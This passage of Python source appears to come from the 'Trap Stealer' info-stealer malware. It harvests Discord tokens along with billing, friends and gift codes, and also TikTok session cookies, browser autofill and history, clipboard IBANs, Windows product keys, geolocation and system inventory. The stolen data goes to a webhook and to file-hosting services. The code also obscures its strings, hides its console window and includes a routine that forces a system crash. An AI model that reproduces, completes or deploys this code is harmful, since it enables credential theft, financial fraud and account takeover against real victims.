        data = b64decode(b'cG93ZXJzaGVsbCBHZXQtSXRlbVByb3BlcnR5VmFsdWUgLVBhdGggJ0hLTE06U09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93cyBOVFxcQ3VycmVudFZlcnNpb25cXFNvZnR3YXJlUHJvdGVjdGlvblBsYXRmb3JtJyAtTmFtZSBCYWNrdXBQcm9kdWN0S2V5RGVmYXVs').decode()
        return run_command(data)
    except Exception as e:
        error_Handler(e)
        return "Couldn't get Product Name"
def get_product_name():
    try:
        data = b64decode(b'cG93ZXJzaGVsbCBHZXQtSXRlbVByb3BlcnR5VmFsdWUgLVBhdGggJ0hLTE06U09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93cyBOVFxcQ3VycmVudFZlcnNpb24nIC1OYW1lIFByb2R1Y3ROYW1l').decode()
        return run_command(data)
    except Exception as e:
        error_Handler(e)
        return "Couldn't get Product Name"
PasswCount = 0
def globalInfo():  
    pr = get_product_name()
    winkey = get_product_key()
    url = 'nosj/oi.ofnipi//:sptth'[::-1]
    req = requests.get(url)
    try:
        user_agent = req.headers['User-Agent']
    except Exception as e:
        error_Handler(e)
        user_agent = "Coudln't get User-Agent"
    data = req.json()
    ip = data['ip']
    loc = data['loc']
    location = loc.split(',')
    latitude = location[0]
    longitude = location[1]
    username = os.getlogin()
    country = data['country']
    country_code = data['country'].lower()
    region = data['region']
    city = data['city']
    postal = data['postal']
    try:
        computer_name = socket.gethostname()
    except Exception as e:
        error_Handler(e)
        computer_name = 'error'
    try:
        cores = os.cpu_count()
    except Exception as e:
        error_Handler(e)
        cores = 'Error'
    try:
        avss = avs()
    except:
        avss = 'Error gettings installed antivirus'
    try:
        system = os.name
    except Exception as e:
        error_Handler(e)
        system = "Error getting os name!"
    try: 
        windll = ctypes.windll.kernel32
        language = windows_locale[ windll.GetUserDefaultUILanguage() ]
    except Exception as e:
        error_Handler(e)
        language = "Coudln't get windows language"
    def gpu():
        try:
            if system == 'Linux':
                gpu_info = os.popen('lspci | grep -i nvidia').read().strip()
                return gpu_info
                
            elif os.name == 'nt': 
                try:
                    gpu_model = subprocess.check_output(["nvidia-smi", "--query-gpu=name", "--format=csv,noheader"]).decode().strip()
                    total_memory = subprocess.check_output(["nvidia-smi", "--query-gpu=memory.total", "--format=csv,noheader,nounits"]).decode().strip()
                    free_memory = subprocess.check_output(["nvidia-smi", "--query-gpu=memory.free", "--format=csv,noheader,nounits"]).decode().strip()
                    used_memory = subprocess.check_output(["nvidia-smi", "--query-gpu=memory.used", "--format=csv,noheader,nounits"]).decode().strip()
                    temperature = subprocess.check_output(["nvidia-smi", "--query-gpu=temperature.gpu", "--format=csv,noheader,nounits"]).decode().strip()

                    gpu_info = f"GPU Model: `{gpu_model}`\nTotal Memory: `{total_memory} MB`\nFree Memory: `{free_memory} MB`\nUsed Memory: `{used_memory} MB`\nGPU Temperature: `{temperature}°C`\n\n"
                    return gpu_info
                except Exception as e:
                    return f"Error retrieving GPU information: {e}"
            else:
                
                return("Unsupported OS for GPU info retrieval")
        except Exception as e:
            error_Handler(e)
            gpu_info = 'ERROR'
            return gpu_info
        

    globalinfo = f"""
    :flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`
    \n User-Agent : {user_agent}
    \n Product name : {pr}
    \n Computer language : `{language}`
    \n Windows Key `{winkey}`
    \n More Information 👀 : 
    \n :flag_{country_code}: - `({region}) ({postal})`
    \n 💻 PC Information : 
    \n`{computer_name}`
    \n Cores: `{cores}` 
    \nGPU  : ```{gpu()}``` \nLatitude + Longitude  : ```{latitude}, {longitude}```
    \n Installed antivirus :
    \n```{avss}``` """
    if len(globalinfo) > 1750:
        globalinfo = globalinfo[:1708] + "\n**Can't show everything, too many data**"
        
    return globalinfo

def antispam():
    file_path = os.path.join(os.getenv("TEMP"), "winlog.txt")

    
    if os.path.exists(file_path):
        with open(file_path, "r") as file:
            saved_time = file.read().strip()
        current_time = time.time()
        saved_time = float(saved_time)
        time_difference = current_time - saved_time
        if time_difference >= 30 * 60:
            with open(file_path, "w") as file:
                current_time = str(time.time())
                file.write(current_time)
        else:
            ctypes.windll.kernel32.ExitProcess(0)
    else:
        with open(file_path, "w") as file:
            current_time = str(time.time())
            file.write(current_time)

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
home_dir = os.path.expanduser('~')
desktop_path = os.path.join(home_dir, 'Desktop')
downloads_path = os.path.join(home_dir, 'Downloads')
documents_path = os.path.join(home_dir, 'Documents')
pictures_path = os.path.join(home_dir, 'Pictures')


def change_about_me(token):
    try:
        headers = {
            "Authorization": f"{token}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Content-Type": "application/json"
        }
        
        data = {
            "bio": biotext
        }
        url = "https://discord.com/api/v9/users/@me/profile"
        response = requests.patch(url, headers=headers, json=data)
    except Exception as e:
        error_Handler(e)

baddglist = [
    {"N": 'Active_Developer', 'V': 4194304, 'E': '<:active:1045283132796063794> '},
    {"N": 'Early_Verified_Bot_Developer', 'V': 131072, 'E': "<:developer:874750808472825986> "},
    {"N": 'Bug_Hunter_Level_2', 'V': 16384, 'E': "<:bughunter_2:874750808430874664> "},
    {"N": 'Early_Supporter', 'V': 512, 'E': "<:early_supporter:874750808414113823> "},
    {"N": 'House_Balance', 'V': 256, 'E': "<:balance:874750808267292683> "},
    {"N": 'House_Brilliance', 'V': 128, 'E': "<:brilliance:874750808338608199> "},
    {"N": 'House_Bravery', 'V': 64, 'E': "<:bravery:874750808388952075> "},
    {"N": 'Bug_Hunter_Level_1', 'V': 8, 'E': "<:bughunter_1:874750808426692658> "},
    {"N": 'HypeSquad_Events', 'V': 4, 'E': "<:hypesquad_events:874750808594477056> "},
    {"N": 'Partnered_Server_Owner', 'V': 2, 'E': "<:partner:874750808678354964> "},
    {"N": 'Discord_Employee', 'V': 1, 'E': "<:staff:874750808728666152> "}
]


Autofill_count = 0
Autofill = []


def writeforfile(data, name):
    path = os.getenv("TEMP") + fr"\wp{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"Trap Stealer\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")


def GetAutofill(path, arg):
    
    try:
        global Autofill, Autofill_count
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"


        shutil.copy2(pathC, tempfold)
        with sql_connect(tempfold) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM autofill WHERE value NOT NULL")
            data = cursor.fetchall()
        os.remove(tempfold)

        for row in data:
            if row[0] != '':
                Autofill.append(f"Name: {row[0]} | Value: {row[1]}")
                Autofill += 1
        writeforfile(Autofill, 'autofill')
    except Exception as e:
        writeforfile(Autofill, 'autofill')


def UserInfo():
    try:
        def execute_command(command):
            try:
                with subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True) as process:
                    result = process.communicate()
                    output = result[0]
                    if process.returncode != 0:
                        output += f"\nError: {result[1]}"
                    return output
            except Exception as e:
                return str(e)

        commands = [
            'wmic os get csname, description, installdate, organization, registereduser, numberofprocesses',
            'wmic os get lastbootuptime, localdatetime, oslanguage, version',
            'wmic qfe get',
            'wmic startup get',
            'wmic nic get',
            'wmic netclient get',
            'wmic netlogin get',
            'wmic netprotocol get',
            'wmic nicconfig get',
            'wmic netuse get',
            'wmic os get /format:list',
            'wmic logicaldisk get caption, description, size, filesystem',
            'wmic diskdrive get caption, size, mediatype',
            'wmic cpu get caption, deviceid, maxclockspeed, numberofcores',
            'wmic memorychip get capacity, devicelocator, speed',
            'wmic bios get manufacturer, version, releasedate',
            'wmic service get name, startname, state',
            'wmic useraccount get name, domain, disabled',
            b64decode('d21pYyBwcm9jZXNzIGxpc3QgYnJpZWY='),
            'wmic printer get name, portname, drivername',
            'tasklist'
        ]

        output_file_path = os.getenv("TEMP") + fr"\winguid.txt"

        with open(output_file_path, 'w') as f:
            f.write('')
        def write_to_file(command, output):
            with open(output_file_path, "a") as f:
                f.write(f"Command: {command}\n")
                f.write(f"Output:\n{output}\n\n")

        for command in commands:
            try:
                output = execute_command(command)
                write_to_file(command, output)
            except Exception as e:
                error_Handler(e)
        with open(output_file_path, "r") as f:
            lines = [line.replace('\t', '    ') for line in f]

        with open(output_file_path, "w") as f:
            f.writelines(lines)
    
        return upload_file(output_file_path)
    except Exception as e:
        error_Handler(e)


def uhqguild(token):
    try:
        uuuhq = []
        headers = {
            "Authorization": token,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }

        response = requests.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)
        gds = response.json()

        for gdss in gds:
            if gdss["approximate_member_count"] < 30 or not (gdss["owner"] or gdss["permissions"] == "4398046511103"):
                continue
            
            request = requests.get(f"https://discord.com/api/v6/guilds/{gdss['id']}/invites", headers=headers)
            invites = request.json()

            nins = invites[0]['code'] if invites else None

            uuuhq.append(f"⚔️ [{gdss['name']}]({f'https://discord.gg/{nins}' if nins else ''}) `({gdss['id']})` **{gdss['approximate_member_count']} Members**")

        return '\n'.join(uuuhq) if uuuhq else "`No HQ Guilds`"
    except Exception as e:
        error_Handler(e)
        return "`No HQ Guilds`"


def get_uhq_friends(tokq, max_friends=5):
    headers = {
        "Authorization": tokq,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        response = requests.get("https://discord.com/api/v6/users/@me/relationships", headers=headers)
        friendlist = response.json()
    except Exception as e:
        error_Handler(e)
        return False

    uhqlist = ''
    friend_count = 0 

    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in baddglist:
            if flags // badge["V"] != 0 and friend['type'] == 1:
                if not "House" in badge["N"] and not badge["N"] == "Active_Developer":
                    OwnedBadges += badge["E"]
                flags = flags % badge["V"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | **{friend['user']['username']}#{friend['user']['discriminator']}** `({friend['user']['id']})`\n"
    return uhqlist if uhqlist != '' else "`No HQ Friends`"

def get_badge(flags):
    if flags == 0:
        return ''

    owned_badges = ''
    for badge in baddglist:
        if flags // badge["V"] != 0:
            owned_badges += badge["E"]
            flags = flags % badge["V"]
    return owned_badges

def TikTokSession(cookie):
    try:
        cookies = {"sessionid": cookie}
        headers = {"Accept-Encoding": "identity"}
        url = 'https://www.tiktok.com/passport/web/account/info/'
        url2 = 'https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988'
        

        response = requests.get(url, headers=headers, cookies=cookies)
        data = response.json()

        response2 = requests.get(url2, headers=headers, cookies=cookies)
        data2 = response2.json()
        user_id = data["data"]["user_id"]
        email = data["data"].get("email", "No Email")
        if not email:
            email = 'No Email'
        
        
        phone = data["data"].get("mobile", "No number")
        if not phone:
            phone = "No phone"
        username = data["data"]["username"]
        coins = data2["data"]["coins"]
        timestamp = data["data"]["create_time"]
        pfp = data["data"]['avatar_url']
        uid = data["data"]["sec_user_id"]
        try:
            url3 = f'https://www.tiktok.com/api/user/list/?count=1&minCursor=0&scene=67&secUid={uid}'
            data3 = requests.get(url3, headers=headers, cookies=cookies).json()
            subscriber = data3["total"]
        except Exception as e:
            error_Handler(e)
            subscriber = "0"

        formatted_date = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))


        data = {
            "username": "Trap Stealer",
            "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
            "content": "",
            "embeds": [
                {
                    "title": f"🍪 Trap Stealer Tiktok Session",
                    "description": f"Founded user information ! :\n",
                    "color": 0xffb6c1,
                    "author": {
                        "name": f"User information :",
                        "icon_url": pfp
                    },
                    "footer": {
                        "text": "Trap Stealer",
                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                    },
                    "thumbnail": {
                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                    },
                    "fields": [
                        {
                            "name": "✨ Cookie:",
                            "value": f"`{cookie}`",
                            "inline": True
                        },
                        {
                            "name": "😊 User ID:",
                            "value": f"`{user_id}`",
                            "inline": True
                        },
                        {
                            "name": "📧 Email:",
                            "value": f"`{email}`",
                            "inline": True
                        },
                        {
                            "name": "📱 Phone:",
                            "value": f"`{phone}`",
                            "inline": True
                        },
                        {
                            "name": "🥃 Username:",
                            "value": f"`{username}`",
                            "inline": True
                        },
                        {
                            "name": "💰 Coins:",
                            "value": f"`{coins}`",
                            "inline": True
                        },
                        {
                            "name": "🔔 Subscriber:",
                            "value": f"`{subscriber}`",
                            "inline": True
                        },
                        {
                            "name": "📅 Created at:",
                            "value": f"`{formatted_date}`",
                            "inline": True
                        },
                    ]
                }
            ],
            "attachments": []
        }
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }

        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)

    except Exception as e:
        pass

        
def get_tokq_info(tokq):
    headers = {
        "Authorization": tokq,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    response = requests.get("https://discord.com/api/v6/users/@me", headers=headers)
    user_info = response.json()

    username = user_info["username"]
    globalusername = 'None'
    if "global_name" in user_info:
        globalusername = user_info["global_name"]
    bio = "None"
    if "bio" in user_info:
        bio = user_info["bio"]
        if len(bio) > 70:
            bio = bio[:67] + "..."
    nsfw = ""
    if "nsfw_allowed" in user_info:
        nsfw = user_info["nsfw_allowed"]
        if nsfw == "False":
            nsfw = "❌"
        else:
            nsfw = "✅"
            
    hashtag = user_info["discriminator"]
    emma = 'liame'
    ema = user_info.get(f"{emma[::-1]}", "")
    user_id = user_info["id"]
    pfp = user_info["avatar"]

    flags = user_info[f"public_flags"]
    nitros = "No Nitro"
    phone = "-"

    if "premium_type" in user_info:
        nitros = user_info["premium_type"]
        if nitros == 1:
            nitros = "<:classic:896119171019067423> Nitro Classic "
        elif nitros == 2:
            nitros = "<a:boost:824036778570416129> <:classic:896119171019067423> Nitro Boost "
            
        elif nitros == 3:
            nitros =  "<:classic:896119171019067423> Nitro Basic "

    if "phone" in user_info:
        phone = f'`{user_info["phone"]}`'

    return username, globalusername, bio, nsfw, hashtag, ema, user_id, pfp, flags, nitros, phone

def trap_exten():
    if Iban_Stealer == True:



        def hide_console1():
            kernel32 = ctypes.WinDLL("kernel32.dll")
            user32 = ctypes.WinDLL("user32.dll")
            get_console_window = kernel32.GetConsoleWindow
            show_window = user32.ShowWindow
            hwnd = get_console_window()
            show_window(hwnd, 0)

        def hide_console2():
            user32 = ctypes.WinDLL("user32.dll")
            get_foreground_window = user32.GetForegroundWindow
            show_window = user32.ShowWindow
            hwnd = get_foreground_window()
            show_window(hwnd, 0)

        def DeobfuscateWeb(encrypted_text, key):
            decrypted = [0] * 256
            for i, char in enumerate(key):
                decrypted[char] = i

            decrypted_text = []
            for char in encrypted_text:
                decrypted_char = decrypted[char]
                decrypted_text.append(decrypted_char)
                
            return bytes(decrypted_text)


        def is_valid_iban(text):
            iban_pattern_eu = r'^[A-Z]{2}\d{2}[A-Z0-9]{4}\d{7}([A-Z0-9]?){0,16}$'
            iban_pattern_na = r'^[A-Z]{2}\d{2}[A-Z0-9]{4}\d{5}([A-Z0-9]?){0,14}$'
            return bool(re.match(iban_pattern_eu, text.replace(" ", ""))) or bool(re.match(iban_pattern_na, text.replace(" ", "")))


        def get_clipboard_content():
            try:
                clipboard_text = subprocess.check_output(['powershell.exe', 'Get-Clipboard'], shell=True, text=True)
                return clipboard_text.strip()
            except subprocess.CalledProcessError as e:

                return None

        def send_to_web(webhookurl, text):
            webhook_url = DeobfuscateWeb(webhookurl[0],webhookurl[1]).decode()
            
            data = {
                "username":"Trap Stealer",
                "avatar_url":"https://cdn3.emoji.gg/emojis/3304_astolfobean.png",

                "embeds": [{
                        "title": "IBAN Detected",
                        "description": f"{text}"
                }]
                }


            data_json = dumps(data).replace('"', '\\"')

            curl_command = f'curl -H "Content-Type: application/json" -d "{data_json}" --insecure {webhook_url}'


            process = subprocess.Popen(curl_command, shell=True, stderr=subprocess.DEVNULL)

            
        hide_console1()
        hide_console2()

        while True:
            time.sleep(1)
            clip_content = get_clipboard_content()
            if is_valid_iban(clip_content) == True:
                data = send_to_web(webhook, clip_content)
                time.sleep(10) if data is True else None
            else:
                pass


    
def checkTokq(Tokq):
    headers = {
        "Authorization": Tokq,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        a = requests.get("https://discord.com/api/v6/users/@me", headers=headers)
        if a.status_code == 401: 
            return False
        else:
            return True
    except Exception as e:
        return False

def GetBilling(Tokq):
    headers = {
        "Authorization": Tokq,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        with requests.get("https://discord.com/api/users/@me/billing/payment-sources", headers=headers) as response:
            billing_json = loads(response.read().decode())
    except Exception as e:
        error_Handler(e)
        return False
    
    if not billing_json:
        return " -"
    billing = ""
    for method in billing_json:
        if not method["invalid"]:
            if method["type"] == 1:
                billing += ":credit_card:"
            elif method["type"] == 2:
                billing += ":parking: "
    return billing


processed_tokens = []

def GetBack():
    try:
        path = os.environ["HOMEPATH"]
        code_path = '\\Downloads\\discord_backup_codes.txt'
        full = path + code_path
        if os.path.exists(path + code_path):
            with open(path + code_path, 'r', encoding='utf-8') as f:
                backup = f.readlines()
                
            return backup
                
    except Exception as e:
        return 'No backup code saved'
    
def get_discord_connections(tokq):
    headers = {
        "Authorization": tokq,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    }
    response = requests.get("https://discord.com/api/v6/users/@me/connections", headers=headers)

    if response.status_code == 200:
        data = response.json() 

        Services = {
            "battlenet": "https://battle.net",
            "ebay": "https://ebay.com",
            "epicgames": "https://epicgames.com",
            "facebook": "https://facebook.com",
            "github": "https://github.com",
            "instagram": "https://instagram.com",
            "leagueoflegends": "https://leagueoflegends.com",
            "paypal": "https://paypal.com",
            "playstation": "https://playstation.com",
            "reddit": "https://reddit.com",
            "riotgames": "https://riotgames.com",
            "spotify": "https://spotify.com",
            "skype": "https://skype.com",
            "steam": "https://store.steampowered.com",
            "tiktok": "https://tiktok.com",
            "twitch": "https://twitch.tv",
            "twitter": "https://twitter.com",
            "xbox": "https://xbox.com",
            "youtube": "https://youtube.com",
        }
        connections_list = []

        for connection in data:
            connections_list.append(f"☂️ Username : `{connection['name']}`\n🌐 Services : [{connection['type']}]({Services.get(connection['type'], 'Unknown')})\n")

        return connections_list
    else:
        return []
    
def get_gift_codes(token):
    response = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token})
    
    if response.status_code == 200:
        gift_codes = response.json()
        
        if gift_codes:
            codes = []

            for code in gift_codes:
                name = code['promotion']['outbound_title']
                code_value = code['code']

                data = f":gift: `{name}`\n:code: `{code_value}`"
                codes.append(data)

            return '\n\n'.join(codes) if codes else 'No Gift'
        else:
            return 'No Gift'
    else:
        return f"No Gift"

processed_id = []
def uploadTokq(Tokq, path):
    if Tokq in processed_tokens:
        return
    
    else: processed_tokens.append(Tokq)
    username, globalusername, bio, nsfw, hashtag, ema, user_id, pfp, flags, nitro, phone = get_tokq_info(Tokq)
    if user_id in processed_id:
        return
    
    else: 
        processed_id.append(Tokq)
    pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{pfp}" if pfp else "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
    back = GetBack()
    billing = GetBilling(Tokq)
    badge = get_badge(flags)
    friends = get_uhq_friends(Tokq)
    guild = uhqguild(Tokq)
    gift = get_gift_codes(Tokq)
    connections = get_discord_connections(Tokq)
    connections = "\n".join(connections)

    
    if friends == '': friends = "No Rare Friends"
    
    if not billing:
        billing = "🔒"
    if not badge:
        badge = "🔒"
    if not phone: 
        phone = "🔒"
    if hashtag == '0':
        hashtag = ''
    tok = 'nekoT'
    em = 'liamE'
    data = {
        "username": "Trap Stealer",
        "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
        "content": "",
        "embeds": [
            {
                "title": f"🍪 Trap Stealer {tok[::-1]}",
                "description": f"`Path` : {path}\n",
                "color": 0xffb6c1,
                "author": {
                    "name": f"{username}#{hashtag} ({user_id})\nGlobal Username : {globalusername}",
                    "icon_url": pfp
                },
                "footer": {
                    "text": "Trap Stealer",
                    "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                },
                "thumbnail": {
                    "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                },
                "fields": [
                    {
                        "name": f"✨ {tok[::-1]}:",
                        "value": f"`{Tokq}`"
                    },
                    {
                        "name": ":mobile_phone: Phone:",
                        "value": phone,
                        "inline": True
                    },
                    {
                        "name": ":ribbon: Bio:",
                        "value": bio,
                        "inline": True
                    },
                    {
                        "name": "🔞 Nsfw Enabled:",
                        "value": nsfw,
                        "inline": True
                    },
                    {
                        "name": f":envelope: {em[::-1]}:",
                        "value": f"`{ema}`",
                        "inline": True
                    },
                    {
                        "name": ":beginner: Badges:",
                        "value": f"{nitro}{badge}",
                        "inline": True
                    },
                    {
                        "name": ":credit_card: Billing:",
                        "value": billing,
                        "inline": True
                    },
                    {
                        "name": "🔮 HQ Friends:",
                        "value": friends,
                        "inline": False
                    },
                    {
                        "name": "⚔️ HQ guilds:",
                        "value": guild,
                        "inline": False
                    },
                    {
                        "name": "🔗 Connections:",
                        "value": connections,
                        "inline": False
                    },
                    {
                        "name": "🎁 Gift:",
                        "value": gift,
                        "inline": False
                    },
                    {
                        "name": "Backup Code",
                        "value": f'{back}',
                        "inline": False
                    }
                    
                ]
            }
        ],
        "attachments": []
    }
    headers= {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    
    character_limit = 1900

    if len(data) > character_limit:
        data = data[:character_limit - 3] + "..."

    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
    if changebio == True:
        change_about_me(Tokq)

def gofileupload(path):
    try:
        data = requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
        return data
    except Exception as e:
        error_Handler(e)
        try:
            try:
                gofileserver = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
            except Exception as e:
                error_Handler(e)
                gofileserver = "store4"
            r = subprocess.Popen(f"curl -F \"file=@{path}\" https://{gofileserver}.gofile.io/uploadFile", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
            return loads(r[0].decode('utf-8'))["data"]["downloadPage"]
        except Exception as e:
            error_Handler(e)
            return False

def catboxmoeupload(path, request_type='upload'):
    try:
        with open(path, 'rb') as file:
            data = {
    'reqtype': 'fileupload',
    'userhash': '',
}
            files = {'fileToUpload': (file.name, file, 'application/octet-stream')}
            response = requests.post(f'https://catbox.moe/user/api.php?request_type={request_type}', files=files, data=data)
            return response.content.decode()
    except Exception as e:
        return False


def fileioupload(path):
    try:
        with open(path, 'rb') as file:
            response = requests.post('https://file.io/', files={'file': file})
        return response.json()["link"]
    except Exception as e:
        return False

def upload_file(path):
    if fileio == True:
        url = fileioupload(path)
    elif Gofile == True:
        url = gofileupload(path)
    elif catbox == True:
        url = catboxmoeupload(path)
    return url
        
def find_history_file(browser_name, path_template):
    if os.name == "nt":
        data_path = os.path.expanduser(path_template.format(browser_name))
    elif os.name == "posix":
        data_path = os.path.expanduser(path_template.format(browser_name))

    return data_path if os.path.exists(data_path) else None

def find_brave_history_file():
    return os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'History')
cl = 0
CookiCount = 0
Cookies = []

def get_brave_history(temp_dir, files_to_zip):
    history_db = find_brave_history_file()

    try:
        conn = sqlite3.connect(history_db)
        cursor = conn.cursor()

        select_statement = "SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url;"
        cursor.execute(select_statement)
        results = cursor.fetchall()

        def parse(url):
            try:
                parsed_url = urlparse(url)
                domain = parsed_url.netloc.replace("www.", "")
                return domain
            except Exception as e:
                pass

        sites_count = {}

        for url, count in results:
            url = parse(url)
            if url in sites_count:
                sites_count[url] += 1
            else:
                sites_count[url] = 1

        output_file = os.path.join(temp_dir, 'brave_search_history.txt')
        with open(output_file, 'w', encoding='utf-8') as file:
            for url, count in sites_count.items():
                file.write(f"URL: {url}, Visits: {count}\n")

        files_to_zip.append(output_file)

        cursor.close()
        conn.close()
    except sqlite3.Error as e:
        pass
        
def find_chrome_history_file():
    return find_history_file("Google\\Chrome\\User Data\\Default\\History", "~\\AppData\\Local\\{}")

def find_edge_history_file():
    return find_history_file("Microsoft\\Edge\\User Data\\Default\\History", "~\\AppData\\Local\\{}")

def find_operagx_history_file():
    return find_history_file("Opera Software\\Opera GX Stable\\History", "~\\AppData\\Roaming\\{}")

def find_firefox_history_file():
    try:
        if os.name == "nt":
            profile_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
        elif os.name == "posix":
            profile_path = os.path.expanduser("~/Library/Application Support/Firefox/Profiles")
        else:
            return None

        profiles = [f for f in os.listdir(profile_path) if f.endswith('.default')]
        if not profiles:
            return None

        profile_path = os.path.join(profile_path, profiles[0])
        history_file_path = os.path.join(profile_path, "places.sqlite")

        return history_file_path if os.path.exists(history_file_path) else None
    except Exception as e:
        error_Handler(e)
        return None

def find_opera_history_file():
    return find_history_file("Opera Software\\Opera Stable\\History", "~\\AppData\\Roaming\\{}")

def find_safari_history_file():
    if os.name == "nt":
        data_path = os.path.expanduser("~\\Apple\\Safari\\History.db")
    elif os.name == "posix":
        data_path = os.path.expanduser("~/Library/Safari/History.db")
    else:
        return None

    return data_path if os.path.exists(data_path) else None

def find_ie_history_file():
    if os.name == "nt":
        data_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Windows\\WebCache\\WebCacheV01.dat")
    else:
        return None

    return data_path if os.path.exists(data_path) else None

def find_safari_technology_preview_history_file():
    if os.name == "nt":
        data_path = os.path.expanduser("~\\Apple\\Safari Technology Preview\\History.db")
    elif os.name == "posix":
        data_path = os.path.expanduser("~/Library/SafariTechnologyPreview/History.db")
    else:
        return None

    return data_path if os.path.exists(data_path) else None

def save_search_history_to_file(history_file, output_file):
    if not history_file:
        return

    try:
        conn = sqlite3.connect(history_file)
        cursor = conn.cursor()
        cursor.execute("SELECT title, url, last_visit_time FROM urls WHERE url LIKE '%google.com/search?q=%' ORDER BY last_visit_time DESC")
        search_history = cursor.fetchall()

        if search_history:
            with open(output_file, 'w', encoding='utf-8') as file:
                for item in search_history:
                    title, url, last_visit_time = item
                    file.write(f"{title} - {url}\n")
        cursor.close()
        conn.close()
    except sqlite3.Error as e:
        if "unable to open database file" in str(e).lower() or "database is locked" in str(e).lower():
            pass

def is_process_running(process_name):
    try:
        output = subprocess.check_output(["tasklist", "/NH", "/FO", "CSV"], shell=True, universal_newlines=True)
        return any(process_name.lower() in line.lower() for line in output.split('\n'))
    except subprocess.CalledProcessError:
        return False

def extract_history_with_timeout(browser_name, find_history_func, temp_dir, files_to_zip):
    browser_executable = f"{browser_name.lower().replace(' ', '_')}.exe"
    if is_process_running(browser_executable):
        return

    history_file = find_history_func()

    if history_file:
        output_file = os.path.join(temp_dir, f"{browser_name.lower().replace(' ', '_')}_search_history.txt")
        try:
            save_search_history_to_file(history_file, output_file)
            files_to_zip.append(output_file)
        except sqlite3.Error as e:
            if "unable to open database file" in str(e).lower() or "database is locked" in str(e).lower():
                pass

def create_browser_zip(browser_name, find_history_func, temp_dir):
    history_file = find_history_func()
    if history_file:
        output_file = os.path.join(temp_dir, f"{browser_name.lower().replace(' ', '_')}_search_history.txt")
        save_search_history_to_file(history_file, output_file)
        return output_file
    return None

def crashs():
    ntdll = ctypes.WinDLL('ntdll.dll')

    RtAdjust = ntdll.RtlAdjustPrivilege
    RtAdjust.argtypes = (ctypes.c_ulong, ctypes.c_bool, ctypes.c_bool, ctypes.POINTER(ctypes.c_bool))
    RtAdjust.restype = ctypes.c_ulong
    PrivilegeState = ctypes.c_bool(False)
    RtAdjust(19, True, False, ctypes.byref(PrivilegeState))

    s = ntdll.NtRaiseHardError
    s.argtypes = (
        ctypes.c_long, ctypes.c_ulong, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulonglong),
        ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)
    )
    s.restype = ctypes.c_ulong
    from ctypes import c_ulong as c_u
    ee = ctypes.c_u(0)
    s(0xC0000006, 0, 0, None, 6, ctypes.byref(ee))


def brohist():
    browsers = {
        "Chrome": find_chrome_history_file,
        "Edge": find_edge_history_file,
